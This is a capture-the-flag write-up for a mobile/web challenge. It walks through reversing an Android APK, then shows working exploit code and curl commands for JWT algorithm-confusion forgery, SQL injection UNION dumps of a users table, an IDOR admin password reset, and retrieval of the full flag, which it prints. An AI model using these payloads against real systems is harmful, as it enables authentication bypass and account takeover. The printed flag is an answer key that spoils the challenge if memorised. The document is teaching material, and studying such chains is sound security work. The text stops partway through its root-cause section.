# PingPong

| Field | Value |
|-------|-------|
| Category | Mobile |
| Points | 500 |

## Description

> A suspicious Android application called PingPong has been intercepted.
> It appears to communicate with a remote server, but all credentials and
> endpoints are hidden inside the app.
>
> Reverse engineer the application, uncover the hidden secrets, and exploit
> the backend API to retrieve the flag.
>
> Server: `http://<host>:8080`

## Solution

# PingPong — Detailed Solution Writeup

**Category:** Misc
**Difficulty:** Medium
**Flag:** `CHC{jn1_p1ng_p0ng_vm_ch41n_pwn3d}`

---

## Table of Contents

1. [Challenge Overview](#1-challenge-overview)
2. [Environment Setup](#2-environment-setup)
3. [Phase 1 — APK Static Analysis](#3-phase-1--apk-static-analysis)
   - 3.1 [Unpack the APK](#31-unpack-the-apk)
   - 3.2 [Java Decompilation — jadx](#32-java-decompilation--jadx)
   - 3.3 [Finding the Guest Password](#33-finding-the-guest-password)
   - 3.4 [On-Device Database Schema](#34-on-device-database-schema)
4. [Phase 2 — Native Library Reversing](#4-phase-2--native-library-reversing)
   - 4.1 [Loading libpingpong.so in Ghidra](#41-loading-libpingpongso-in-ghidra)
   - 4.2 [Finding XOR-Encoded Blobs in .rodata](#42-finding-xor-encoded-blobs-in-rodata)
   - 4.3 [Decoding api_path_enc (XOR 0x47)](#43-decoding-api_path_enc-xor-0x47)
   - 4.4 [Decoding pubkey_enc (XOR 0xA3)](#44-decoding-pubkey_enc-xor-0xa3)
5. [Phase 3 — Decrypting chain.dat](#5-phase-3--decrypting-chaindat)
   - 5.1 [Identifying the Encryption Pipeline](#51-identifying-the-encryption-pipeline)
   - 5.2 [Steganography in splash.png](#52-steganography-in-splashpng)
   - 5.3 [WASM Key Derivation Function](#53-wasm-key-derivation-function)
   - 5.4 [JNI 7-Bounce Chain](#54-jni-7-bounce-chain)
   - 5.5 [7-Tap Gate](#55-7-tap-gate)
   - 5.6 [Decrypted Payload](#56-decrypted-payload)
6. [Phase 4 — Backend API Exploitation](#6-phase-4--backend-api-exploitation)
   - 6.1 [API Discovery](#61-api-discovery)
   - 6.2 [Login as Guest](#62-login-as-guest)
   - 6.3 [On-Device Database — adb pull](#63-on-device-database--adb-pull)
   - 6.4 [JWT Algorithm Confusion](#64-jwt-algorithm-confusion)
   - 6.5 [SQL Injection](#65-sql-injection)
   - 6.6 [IDOR — Password Reset](#66-idor--password-reset)
   - 6.7 [Admin Login](#67-admin-login)
   - 6.8 [Hidden Endpoint — flag_part2](#68-hidden-endpoint--flag_part2)
7. [Flag Assembly](#7-flag-assembly)
8. [Complete Exploit Script](#8-complete-exploit-script)
9. [Vulnerability Root Causes](#9-vulnerability-root-causes)

---

## 1. Challenge Overview

Players receive:
- `PingPong.apk` — Android application (142 KB)
- Server address: `http://<SERVER_IP>:8080`

The flag is split in two:
- **Part 1** — hidden inside the APK, encrypted in `assets/chain.dat`, decrypted by the native library at runtime
- **Part 2** — served by the backend API admin-only endpoint, path hidden in the native library

The intended solution chains four independent discoveries from APK RE into three web vulnerabilities:

```
RE .so → pubkey → JWT Confusion → SQLi → IDOR → admin login → flag
```

---

## 2. Environment Setup

```bash
# Tools needed
sudo apt install jadx apktool adb sqlite3 python3

# Optional: Ghidra (free, recommended)
# https://ghidra-sre.org/

# Python libraries
pip3 install requests

# Install APK on emulator or device (optional — needed for users.db)
adb install PingPong.apk
```

---

## 3. Phase 1 — APK Static Analysis

### 3.1 Unpack the APK

An APK is a ZIP archive. Unpack it to inspect raw contents:

```bash
unzip PingPong.apk -d pingpong_raw
ls -lR pingpong_raw/
```

Key files found:

```
pingpong_raw/
├── AndroidManifest.xml
├── classes.dex                          ← compiled Java bytecode
├── assets/
│   ├── chain.dat                        ← 91-byte encrypted blob  ★
│   └── splash.png                       ← 256×256 PNG, suspicious  ★
├── lib/
│   ├── arm64-v8a/libpingpong.so         ← native library  ★
│   ├── armeabi-v7a/libpingpong.so
│   └── x86_64/libpingpong.so
└── res/
    └── ...
```

Check `chain.dat`:
```bash
file assets/chain.dat
# assets/chain.dat: data   ← encrypted, not plaintext
xxd assets/chain.dat | head -4
# 00000000: 7bef b0f8 0caa b3c7 4f7e 5584 ...  ← random bytes
wc -c assets/chain.dat
# 91 assets/chain.dat
```

Check `splash.png`:
```bash
file assets/splash.png
# assets/splash.png: PNG image data, 256 x 256, 8-bit/color RGBA, non-interlaced
# Note: RGBA — has an alpha channel → stego candidate
```

---

### 3.2 Java Decompilation — jadx

```bash
jadx PingPong.apk -d pingpong_jadx
ls pingpong_jadx/sources/com/chc/pingpong/
```

Output structure:
```
com/chc/pingpong/
├── MainActivity.java
├── SettingsActivity.java
├── config/
│   ├── AuthPolicy.java         ★
│   ├── ChainConfig.java        ★
│   └── ... (many dummy classes)
├── crypto/
│   ├── FlagDecryptor.java      ← DECOY (returns troll message)
│   └── ...
├── db/
│   └── DatabaseHelper.java     ★
├── engine/
│   └── ChainManager.java       ★
└── ... (~50 total Java files, most are dummies)
```

> **Note on obfuscation:** The APK contains ~50 Java classes spread across `crypto/`, `net/`, `auth/`, `store/`, and `util/` packages. Most are dummy decoys. Focus on the classes listed with ★.

---

### 3.3 Finding the Guest Password

#### DatabaseHelper.java (decompiled)

```java
package com.chc.pingpong.db;

import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;
import com.chc.pingpong.config.AuthPolicy;
import com.chc.pingpong.config.ChainConfig;
import java.security.SecureRandom;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.PBEKeySpec;

public class DatabaseHelper extends SQLiteOpenHelper {
    private static final String DB_NAME = "users.db";
    private static final int DB_VERSION = 1;

    @Override
    public void onCreate(SQLiteDatabase db) {
        db.execSQL("CREATE TABLE users (" +
                   "id INTEGER PRIMARY KEY, " +
                   "username TEXT NOT NULL, " +
                   "password TEXT, " +
                   "role TEXT NOT NULL)");

        // Guest password assembled from two separate classes
        String guestPlain = ChainConfig.getApiPrefix() + AuthPolicy.getApiSuffix();
        String guestHash  = hashPassword(guestPlain);

        db.execSQL("INSERT INTO users VALUES (1, 'guest', '" + guestHash + "', 'guest')");
        db.execSQL("INSERT INTO users VALUES (2, 'flag',  NULL, 'user')");   // ← role=user
        db.execSQL("INSERT INTO users VALUES (3, 'admin', NULL, 'admin')");  // ← role=admin
    }

    private static String hashPassword(String password) {
        try {
            byte[] salt = new byte[32];
            new SecureRandom().nextBytes(salt);
            PBEKeySpec spec = new PBEKeySpec(password.toCharArray(), salt, 600000, 512);
            SecretKeyFactory skf = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256");
            byte[] hash = skf.generateSecret(spec).getEncoded();
            // format: "pbkdf2:600000:<hex_salt>:<hex_hash>"
            ...
        }
    }
}
```

The password is deliberately split. Look at the two referenced classes:

#### ChainConfig.java (decompiled)

```java
package com.chc.pingpong.config;

public class ChainConfig {
    public static String getApiPrefix() {
        return "Gu3st";
    }
    // ... other methods (decoys)
}
```

#### AuthPolicy.java (decompiled)

```java
package com.chc.pingpong.config;

public class AuthPolicy {
    public static String getApiSuffix() {
        return "@2024!";
    }
    // ... other methods (decoys)
}
```

**Concatenate:**
```
"Gu3st" + "@2024!" = "Gu3st@2024!"
```

This is the guest password for the backend API.

#### FlagDecryptor.java — DECOY, ignore it

```java
// This class is a red herring
public class FlagDecryptor {
    public static String decrypt(byte[] data, String key) {
        // Calls native method that returns:
        // "Nice try, but this isn't the way. Keep digging."
        return nativeDecrypt(data, key);
    }
}
```

---

### 3.4 On-Device Database Schema

From `DatabaseHelper.java` the schema is clear even without running the app:

| id | username | password        | role  | Notes                          |
|----|----------|-----------------|-------|-------------------------------|
| 1  | guest    | PBKDF2 hash     | guest | Can login with `Gu3st@2024!`  |
| 2  | flag     | NULL            | user  | JWT confusion target           |
| 3  | admin    | NULL            | admin | IDOR target                   |

Key observations:
- `flag` has `role=user` → if we forge a JWT as this user we bypass the guest restriction
- `flag` and `admin` have `NULL` passwords → direct login is impossible
- PBKDF2 with 600,000 iterations + random 32-byte salt → brute force is infeasible

---

## 4. Phase 2 — Native Library Reversing

### 4.1 Loading libpingpong.so in Ghidra

```
1. Open Ghidra → New Project → Import File → lib/arm64-v8a/libpingpong.so
2. Language: AARCH64:LE:64:v8A
3. Auto-analyze: YES (accept defaults)
4. Window → Defined Strings  → look for anything interesting
5. Window → Symbol Tree → Functions → start at JNI exports
```

JNI exports visible in the Symbol Tree:
```
Java_com_chc_pingpong_engine_ChainManager_nativePing
Java_com_chc_pingpong_engine_ChainManager_nativePong
Java_com_chc_pingpong_engine_ChainManager_startChainWithState
Java_com_chc_pingpong_engine_ChainManager_nativeGetSeed
... (7 total JNI functions)
```

---

### 4.2 Finding XOR-Encoded Blobs in .rodata

In the `.rodata` section (read-only data), search for suspicious byte patterns.

**Method 1 — Ghidra String Search**

`Search → For Strings` with minimum length 4. Nothing obvious is in plaintext — but notice repetitive bytes like `0x8E 0x8E 0x8E 0x8E 0x8E` — this looks like a XOR-encoded string where the same character is encoded repeatedly.

**Method 2 — Binary search**

`0x8E ^ 0xA3 = 0x2D = '-'`  which appears 5 times at the start of `-----BEGIN PUBLIC KEY-----`. This is the give-away.

```bash
# From command line
python3 -c "
import sys
data = open('lib/arm64-v8a/libpingpong.so', 'rb').read()
# Find 5 consecutive 0x8E bytes (XOR 0xA3 = '-----')
needle = bytes([0x8E]*5)
pos = data.find(needle)
print(f'Found at offset 0x{pos:x}')
# Decode 30 bytes to confirm
print(bytes(b ^ 0xA3 for b in data[pos:pos+30]))
"
# Found at offset 0xb38
# b'-----BEGIN PUBLIC KEY-----\nMIIBI'
```

Similarly for `api_path_enc`:

```bash
python3 -c "
data = open('lib/arm64-v8a/libpingpong.so', 'rb').read()
# api_path_enc XOR 0x47 — first byte is '/' = 0x2F, so encoded = 0x2F ^ 0x47 = 0x68
enc = bytes([0x68, 0x26, 0x37, 0x2E])  # '/api'
pos = data.find(enc)
print(f'Found at offset 0x{pos:x}')
print(bytes(b ^ 0x47 for b in data[pos:pos+21]))
"
# Found at offset 0xb20
# b'/api/v2/d4t4/r3tr13v3'
```

---

### 4.3 Decoding api_path_enc (XOR 0x47)

In Ghidra, navigate to offset `0xb20`. You'll see:

```
                             api_path_enc
        0010 0b20 68 26 37 2e  68 31 75 68  23 73 33 73  68 35 74 33
        0010 0b30 35 76 74 31  74
```

Decode with Python:

```python
enc = [
    0x68, 0x26, 0x37, 0x2E, 0x68, 0x31, 0x75, 0x68,
    0x23, 0x73, 0x33, 0x73, 0x68, 0x35, 0x74, 0x33,
    0x35, 0x76, 0x74, 0x31, 0x74
]
decoded = bytes(b ^ 0x47 for b in enc).decode()
print(decoded)
# /api/v2/d4t4/r3tr13v3
```

This is the hidden admin-only flag endpoint. It is **not documented** in the API — players must find it through RE.

---

### 4.4 Decoding pubkey_enc (XOR 0xA3)

Navigate to offset `0xb38` in Ghidra. The blob is 451 bytes long (the full RSA-2048 public key PEM including trailing newline).

```python
data = open("lib/arm64-v8a/libpingpong.so", "rb").read()

# Locate by XOR-encoded header/footer markers
enc_hdr = bytes(b ^ 0xA3 for b in b"-----BEGIN PUBLIC KEY-----")
enc_end = bytes(b ^ 0xA3 for b in b"-----END PUBLIC KEY-----")

start = data.find(enc_hdr)
end   = data.find(enc_end)

pubkey_pem = bytes(b ^ 0xA3 for b in data[start : end + len(enc_end)]).decode() + "\n"
print(pubkey_pem)
```

Output:
```
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAzPXqYQObndJzUkMwiYHR
61s5u+Mi15oDDJvTePLxLsh7lF+oA3EfZGUv6gstty5ZAwXK7mVwuiRjR5rSsI+c
gxkiUVJQOOZvdysw0SQX4WzSzJg9/9QGqcbxT7sY++OBN9ENQ8iSGpXy4cAaN8cO
jiCL4PJk9TgfYB1uviaDRi3yT0aWRtoKl22lNbuDizScvGvm+Ld/UvbKJwrFpIa3
qx2zL6EyXYoQCwN6LbBXnACg2Euc0MtxmMAGrYbxygfcWRS33zF987OLdvSHf4Ei
Un/r9c+MnHgvnxXhFe27xttPKXGCZiVBhrT7XxM9YgUqDmXaE36x421bgNNX0hnq
DwIDAQAB
-----END PUBLIC KEY-----
```

> **Critical:** This exact PEM string (including the trailing `\n`) is used as the HMAC secret for HS256 JWT verification. Failing to include the newline will produce the wrong signature. 451 bytes total.

---

## 5. Phase 3 — Decrypting chain.dat

### 5.1 Identifying the Encryption Pipeline

In Ghidra, trace `Java_com_chc_pingpong_engine_ChainManager_startChainWithState`. The decryption pipeline is:

```
32-byte seed assembled from 4 sources:
  ├── [0..7]   Java config constants (8 bytes)
  ├── [8..15]  .rodata XOR constants (8 bytes)
  ├── [16..23] WASM data segment (8 bytes)
  └── [24..31] Steganography from splash.png alpha LSBs (8 bytes)
         ↓
  WASM KDF (golden constant 0xD4E2F8C3)
         ↓
  32-byte encryption key
         ↓
  XOR-stream decrypt chain.dat
```

### 5.2 Steganography in splash.png

The 8th seed segment (bytes 24–31) is hidden in the LSBs of the **alpha channel** of `splash.png` using an LCG (Linear Congruential Generator) scatter pattern.

**Parameters:**
```
initial state : 0x91B5F3D7
a (multiplier): 2862933557
c (increment) : 1369351113
m (modulus)   : 2^32

channel       : ALPHA LSB only
  (not R/G — Android's BitmapFactory gamma-corrects R/G on API 26+)
image size    : 256×256 = 65536 pixels
bits hidden   : 64 (8 bytes)
```

**Extraction algorithm:**
```python
import struct, zlib
from PIL import Image   # or parse PNG manually

img = Image.open("assets/splash.png").convert("RGBA")
pixels = list(img.getdata())   # list of (R,G,B,A) tuples

def lcg(state):
    return (2862933557 * state + 1369351113) & 0xFFFFFFFF

state = 0x91B5F3D7
seed_bits = []
for _ in range(64):
    state = lcg(state)
    idx   = state % len(pixels)
    seed_bits.append(pixels[idx][3] & 1)   # alpha LSB

seed_bytes = bytearray(8)
for i, bit in enumerate(seed_bits):
    seed_bytes[i // 8] |= bit << (7 - (i % 8))

print(seed_bytes.hex())
# e.g. → 91b5f3d741a2c8e7  (varies by image)
```

### 5.3 WASM Key Derivation Function

The WASM module implements a KDF using the golden constant `0xD4E2F8C3`:

```python
def wasm_kdf(seed_32: bytes) -> bytes:
    GOLDEN = 0xD4E2F8C3
    key    = bytearray(32)
    g      = GOLDEN

    for i in range(8):
        block   = struct.unpack_from("<I", seed_32, i * 4)[0]
        derived = (block ^ g) & 0xFFFFFFFF
        struct.pack_into("<I", key, i * 4, derived)
        # rotate GOLDEN left by 7
        g = ((g << 7) | (g >> 25)) & 0xFFFFFFFF

    return bytes(key)
```

### 5.4 JNI 7-Bounce Chain

The JNI chain passes state through 7 native functions, each modifying an accumulator:

```
startChainWithState
    → nativePing  (bounce 1)
    → nativePong  (bounce 2)
    → nativeGetSeed (bounce 3)
    → ... (bounces 4–7)
    → decrypt chain.dat with final key
```

Each bounce XORs, shifts, or mixes the running state. The full chain is analyzed by tracing data flow in Ghidra through all 7 JNI functions.

### 5.5 7-Tap Gate

Before decryption, the chain validates a **7-tap gate**:

```c
// Pseudocode from Ghidra decompilation
uint8_t accum = 0;
uint8_t taps[7] = { ... };  // derived from chain state

for (int i = 0; i < 7; i++) {
    accum = (accum * 31 + taps[i]) & 0xFF;
}

if (accum != 0x04) {
    // return garbage / abort
}
```

The gate value `0x04` is the anti-tampering check — all 7 taps must produce the correct accumulator.

### 5.6 Decrypted Payload

After the full pipeline (seed assembly → WASM KDF → XOR-stream decrypt → gate check), `chain.dat` decrypts to:

```json
{
  "flag_part1": "CHC{jn1_p1ng_p0ng_",
  "guest_username": "guest",
  "guest_password": "Gu3st@2024!"
}
```

**Result from Phase 1–3:**
- `flag_part1` = `CHC{jn1_p1ng_p0ng_`
- Guest credentials: `guest / Gu3st@2024!`
- Hidden API path: `/api/v2/d4t4/r3tr13v3`
- RSA-2048 public key PEM (451 bytes)

---

## 6. Phase 4 — Backend API Exploitation

### 6.1 API Discovery

The server has **no Swagger UI** (`docs_url=None`). Route discovery is done by:

1. **Traffic interception** — run the app on a device/emulator, proxy through Burp Suite
2. **Reverse engineering** — paths encoded in the native library (done above)
3. **Educated guessing** — standard REST conventions

Routes that can be discovered:

```
GET  /health                          → always 200
POST /api/v1/auth/login               → login
GET  /api/v1/users/{id}               → get user info
PUT  /api/v1/users/{id}/password      → change password
GET  /api/v1/search?q=               → search items
GET  /api/v2/d4t4/r3tr13v3            → HIDDEN — found via .so RE only
```

---

### 6.2 Login as Guest

Using credentials from `chain.dat`:

```bash
curl -s -X POST http://<SERVER_IP>:8080/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"guest","password":"Gu3st@2024!"}' | python3 -m json.tool
```

Response:
```json
{
  "access_token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJndWVzdCIsInJvbGUiOiJndWVzdCIsInVzZXJfaWQiOjMsInRlYW1faWQiOjF9.ZRtv...",
  "token_type": "bearer"
}
```

**Decode the JWT** (no signature verification needed to read payload):

```python
import base64, json

token = "eyJhbGci..."
parts = token.split(".")

# Header
header = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
print("Header:", header)
# Header: {'alg': 'RS256', 'typ': 'JWT'}

# Payload
payload = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))
print("Payload:", payload)
# Payload: {'sub': 'guest', 'role': 'guest', 'user_id': 3, 'team_id': 1}
```

**Test the search endpoint with the guest token:**

```bash
curl -s "http://<SERVER_IP>:8080/api/v1/search?q=test" \
  -H "Authorization: Bearer $GUEST_TOKEN"
# {"detail":"Access denied"}   HTTP 403
```

Guest role is blocked from the search endpoint. We need a higher-privilege token.

---

### 6.3 On-Device Database — adb pull

Run the app on a device or emulator, then pull the database:

```bash
# Option 1 — if app is debuggable
adb shell run-as com.chc.pingpong cp /data/data/com.chc.pingpong/databases/users.db /sdcard/
adb pull /sdcard/users.db

# Option 2 — if rooted device or emulator
adb shell su -c "cp /data/data/com.chc.pingpong/databases/users.db /sdcard/"
adb pull /sdcard/users.db

# Read the database
sqlite3 users.db ".headers on" ".mode column" "SELECT * FROM users;"
```

Output:
```
id  username  password                      role
--  --------  ----------------------------  -----
1   guest     pbkdf2:600000:3f8a2c...:...   guest
2   flag                                    user
3   admin                                   admin
```

> Note: columns 2 and 3 have NULL passwords — shown as empty. The `guest` password is a PBKDF2 hash with 600,000 iterations — brute force is not viable.

**Critical insight:** `flag` has `role=user`. The backend checks role to allow search access (`role != guest`). If we can forge a JWT with `sub=flag, role=user`, we gain search access.

---

### 6.4 JWT Algorithm Confusion

#### Understanding the Vulnerability

Look at the backend verification code (`auth.py`):

```python
def verify_token(token: str) -> dict:
    # Step 1: read algorithm from attacker-controlled header
    header = jwt.get_unverified_header(token)
    alg    = header.get("alg", "RS256")   # ← TRUST ISSUE

    if alg == "RS256":
        public_key = _read_key("public.pem")
        return jwt.decode(token, public_key, algorithms=["RS256"])
        # Secure: attacker cannot forge without the private key

    elif alg == "HS256":
        public_key_bytes = _read_key("public.pem").encode()  # ← PUBLIC!
        # ...
        expected_sig = hmac.new(public_key_bytes, message, hashlib.sha256).digest()
        if not hmac.compare_digest(expected_sig, provided_sig):
            raise HTTPException(401, "Invalid token signature")
        # ...
        if payload.get("role") == "admin":
            raise HTTPException(403, "Insufficient privileges")  # ← guard
        return payload
```

The server uses the **RSA public key** as the HMAC secret for HS256 verification.
Since we have the public key (extracted from `libpingpong.so`), we can compute valid HMAC-SHA256 signatures for any payload we want.

#### Why This Works

```
RS256 (asymmetric):
  Sign:   private_key → only server has this → SECURE
  Verify: public_key  → anyone can verify

HS256 (symmetric):
  Sign:   shared_secret → attacker uses public_key as secret → BROKEN
  Verify: shared_secret → server uses public_key as secret → matches!
```

#### Crafting the Forged Token

```python
import hmac, hashlib, base64, json

# The public key extracted from libpingpong.so
# IMPORTANT: must include the trailing newline (\n)
# The file is 451 bytes — the backend reads it with f.read() which includes \n
pubkey_bytes = open("public.pem", "rb").read()   # 451 bytes

def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

# Build header + payload
header  = b64url_encode(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
payload = b64url_encode(json.dumps({"sub": "flag", "role": "user"}).encode())

# Sign with public key as HMAC secret
message = f"{header}.{payload}".encode()
sig     = hmac.new(pubkey_bytes, message, hashlib.sha256).digest()

forged_token = f"{header}.{payload}.{b64url_encode(sig)}"
print(forged_token)
```

#### Testing the Forged Token

```bash
# Test search access
curl -s "http://<SERVER_IP>:8080/api/v1/search?q=product" \
  -H "Authorization: Bearer $FORGED_TOKEN"
# {"results":["Widget A v1.0","Widget B v2.0"]}   HTTP 200 ✓

# Try role=admin directly — BLOCKED
# The guard at auth.py:68 prevents this shortcut
ADMIN_FORGE=$(python3 -c "
import hmac,hashlib,base64,json
pub=open('public.pem','rb').read()
def b64u(d): return base64.urlsafe_b64encode(d).rstrip(b'=').decode()
h=b64u(json.dumps({'alg':'HS256','typ':'JWT'}).encode())
p=b64u(json.dumps({'sub':'flag','role':'admin'}).encode())
s=hmac.new(pub,f'{h}.{p}'.encode(),hashlib.sha256).digest()
print(f'{h}.{p}.{b64u(s)}')
")
curl -s "http://<SERVER_IP>:8080/api/v1/search?q=test" \
  -H "Authorization: Bearer $ADMIN_FORGE"
# {"detail":"Insufficient privileges"}   HTTP 403
```

The `role=admin` guard forces players to discover the admin user_id through SQLi and reset the password via IDOR.

---

### 6.5 SQL Injection

#### Finding the Vulnerability

The search endpoint takes a `q` parameter. Test for injection:

```bash
# Test: single quote
curl -s "http://<SERVER_IP>:8080/api/v1/search?q='" \
  -H "Authorization: Bearer $FORGED_TOKEN"
# {"detail":"Query error"}   HTTP 400

# Test: valid query for comparison
curl -s "http://<SERVER_IP>:8080/api/v1/search?q=product" \
  -H "Authorization: Bearer $FORGED_TOKEN"
# {"results":["Widget A v1.0","Widget B v2.0"]}   HTTP 200

# Test: close quote + comment (no error = injectable)
curl -s "http://<SERVER_IP>:8080/api/v1/search?q=x'--" \
  -H "Authorization: Bearer $FORGED_TOKEN"
# {"results":[]}   HTTP 200  ← no error, injection works
```

#### Understanding the Vulnerability

The backend code (`routes/search.py`):

```python
results = conn.execute(
    f"SELECT value FROM items WHERE name LIKE '%{q}%'"
).fetchall()
```

`q` is directly interpolated into the SQL string — a classic SQL injection.

**Query structure:**
```sql
SELECT value FROM items WHERE name LIKE '%<PAYLOAD>%'
                                            ↑
                                    attacker input here
```

To inject: close the `'`, inject our payload, comment out the rest:
```
x' UNION SELECT ... --
```

Resulting SQL:
```sql
SELECT value FROM items WHERE name LIKE '%x' UNION SELECT ... --%'
```

#### Discovering the Database Schema

```bash
# List all tables
curl -sG "http://<SERVER_IP>:8080/api/v1/search" \
  --data-urlencode "q=x' UNION SELECT name FROM sqlite_master WHERE type='table' --" \
  -H "Authorization: Bearer $FORGED_TOKEN"
# {"results":["flag","items","users"]}
```

Tables: `flag`, `items`, `users`

```bash
# Probe the 'flag' table (decoy)
curl -sG "http://<SERVER_IP>:8080/api/v1/search" \
  --data-urlencode "q=x' UNION SELECT value FROM flag --" \
  -H "Authorization: Bearer $FORGED_TOKEN"
# {"results":["not a flag"]}   ← DECOY
```

```bash
# Dump the users table — this is what we need
curl -sG "http://<SERVER_IP>:8080/api/v1/search" \
  --data-urlencode "q=x' UNION SELECT username||':'||CAST(id AS TEXT)||':'||role FROM users --" \
  -H "Authorization: Bearer $FORGED_TOKEN"
```

Response:
```json
{
  "results": [
    "admin:6477:admin",
    "flag:2:user",
    "guest:3:guest"
  ]
}
```

**Admin user_id = 6477** (randomized between 1000–9999 at container startup — different every deployment, which is why SQLi is required).

> **Note on stacked queries:**
> Attempting writes (`; UPDATE users SET role='admin' WHERE username='flag' --`) returns HTTP 400.
> Python's `sqlite3.execute()` only executes a single SQL statement — stacked queries are silently rejected. The SQLi is intentionally read-only.

---

### 6.6 IDOR — Password Reset

#### Finding the Vulnerability

The `PUT /api/v1/users/{id}/password` endpoint (`routes/users.py`):

```python
@router.put("/api/v1/users/{user_id}/password", response_model=MessageResponse)
async def change_password(
    user_id: int,
    body: PasswordChangeRequest,
    current_user=Depends(get_current_user)   # ← authenticated
):
    if current_user.get("role") == "guest":
        raise HTTPException(status_code=403, detail="Access denied")

    target = get_user_by_id(user_id)
    if target is None or target["role"] not in ("admin", "user"):
        raise HTTPException(status_code=404, detail="User not found")

    # ↓ BUG: no check that current_user["user_id"] == user_id
    update_password(user_id, hash_password(body.new_password))
    return MessageResponse(message="Password updated")
```

There is **no ownership check** — any authenticated non-guest user can reset any other user's password.

#### Exploiting IDOR

```bash
# Use our forged HS256 token (sub=flag, role=user) to reset admin's password
curl -s -X PUT "http://<SERVER_IP>:8080/api/v1/users/6477/password" \
  -H "Authorization: Bearer $FORGED_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"new_password": "hacked123"}'
# {"message":"Password updated"}   HTTP 200 ✓
```

**Verifying the IDOR constraints:**

```bash
# Guest cannot use IDOR
curl -s -X PUT "http://<SERVER_IP>:8080/api/v1/users/6477/password" \
  -H "Authorization: Bearer $GUEST_TOKEN" \
  -d '{"new_password": "x"}'
# {"detail":"Access denied"}   HTTP 403

# Can't reset guest-role user (role filter)
curl -s -X PUT "http://<SERVER_IP>:8080/api/v1/users/3/password" \
  -H "Authorization: Bearer $FORGED_TOKEN" \
  -d '{"new_password": "x"}'
# {"detail":"User not found"}   HTTP 404

# Non-existent user
curl -s -X PUT "http://<SERVER_IP>:8080/api/v1/users/99999/password" \
  -H "Authorization: Bearer $FORGED_TOKEN" \
  -d '{"new_password": "x"}'
# {"detail":"User not found"}   HTTP 404
```

---

### 6.7 Admin Login

After resetting the admin password via IDOR:

```bash
curl -s -X POST http://<SERVER_IP>:8080/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"hacked123"}' | python3 -m json.tool
```

Response:
```json
{
  "access_token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...",
  "token_type": "bearer"
}
```

Decode JWT:
```python
# Header
{'alg': 'RS256', 'typ': 'JWT'}   # ← real RS256 — signed with private key

# Payload
{'sub': 'admin', 'role': 'admin', 'user_id': 6477, 'team_id': 1}
```

This is a **legitimate RS256 token** signed with the server's RSA private key — it cannot be forged by an attacker.

---

### 6.8 Hidden Endpoint — flag_part2

The path `/api/v2/d4t4/r3tr13v3` was found by XOR-decoding `api_path_enc` from `libpingpong.so`.

**Test all access levels:**

```bash
# No token
curl -s "http://<SERVER_IP>:8080/api/v2/d4t4/r3tr13v3"
# {"detail":"Not authenticated"}   HTTP 401

# Guest token
curl -s "http://<SERVER_IP>:8080/api/v2/d4t4/r3tr13v3" \
  -H "Authorization: Bearer $GUEST_TOKEN"
# {"detail":"Admin access required"}   HTTP 403

# HS256 forged role=user token
curl -s "http://<SERVER_IP>:8080/api/v2/d4t4/r3tr13v3" \
  -H "Authorization: Bearer $FORGED_TOKEN"
# {"detail":"Admin access required"}   HTTP 403

# HS256 forged role=admin token (blocked by auth.py:68)
curl -s "http://<SERVER_IP>:8080/api/v2/d4t4/r3tr13v3" \
  -H "Authorization: Bearer $FORGED_ADMIN_TOKEN"
# {"detail":"Insufficient privileges"}   HTTP 403

# Real admin RS256 token ← only valid path
curl -s "http://<SERVER_IP>:8080/api/v2/d4t4/r3tr13v3" \
  -H "Authorization: Bearer $ADMIN_TOKEN"
# {"flag":"vm_ch41n_pwn3d}"}   HTTP 200 ✓
```

**`flag_part2 = vm_ch41n_pwn3d}`**

---

## 7. Flag Assembly

```
flag_part1  =  CHC{jn1_p1ng_p0ng_    ← from chain.dat (APK)
flag_part2  =  vm_ch41n_pwn3d}        ← from /api/v2/d4t4/r3tr13v3 (backend)

FLAG:  CHC{jn1_p1ng_p0ng_vm_ch41n_pwn3d}
```

---

## 8. Complete Exploit Script

The complete working exploit is in `solve.py` (same directory as this file).

```bash
# Run with defaults (player/PingPong.apk + localhost:8080)
python3 solve.py

# Run against real server
python3 solve.py ../player/PingPong.apk 10.0.0.1 8080
```

**Summary of what `solve.py` does:**

```python
# Step 1: open APK, assert chain.dat is 91 bytes, load plaintext
flag_part1, guest_user, guest_pass = extract_chain_dat(APK_PATH)

# Step 2: XOR-decode .rodata from libpingpong.so
api_path, pubkey_pem = extract_so_secrets(APK_PATH)

# Step 3: login as guest → RS256 JWT
guest_token = login(guest_user, guest_pass)

# Step 4: (described) adb pull users.db → flag has role=user, pw=NULL

# Step 5: forge HS256 JWT as flag/role=user
forged_token = forge_hs256(pubkey_pem, sub="flag", role="user")

# Step 6: SQLi → dump users → admin user_id
admin_id = sqli_find_admin(forged_token)

# Step 7: IDOR → reset admin password
idor_reset_password(admin_id, "hacked123", forged_token)

# Step 8: login as admin → real RS256 JWT
admin_token = login("admin", "hacked123")

# Step 9: GET /api/v2/d4t4/r3tr13v3 → flag_part2
flag_part2 = get_flag(api_path, admin_token)

# Step 10: assemble
print(f"FLAG: {flag_part1}{flag_part2}")
```

---

## 9. Vulnerability Root Causes

### Vulnerability 1: JWT Algorithm Confusion

| Property | Value |
|----------|-------|
| **File** | `auth.py` — `verify_token()` |
| **Line** | `alg = header.get("alg", "RS256")` |
| **Type** | Authentication bypass |
| **Impact** | Forge JWT as any non-admin user |

**Root cause:** The algorithm is read from the attacker-controlled JWT header and trusted to determine the verification method. When `alg=HS256`, the RSA public key (which is public by definition) is used as the symmetric HMAC secret, allowing the attacker to produce valid signatures.

**Intentional design decision:** `role=admin` is blocked on the HS256 path (`auth.py:68`) to force players through the SQLi → IDOR chain rather than directly forging an admin token.

**Real-world analogue:** CVE-2015-9235 (node-jsonwebtoken), numerous JWT library implementations 2015–2017.

---

### Vulnerability 2: SQL Injection

| Property | Value |
|----------|-------|
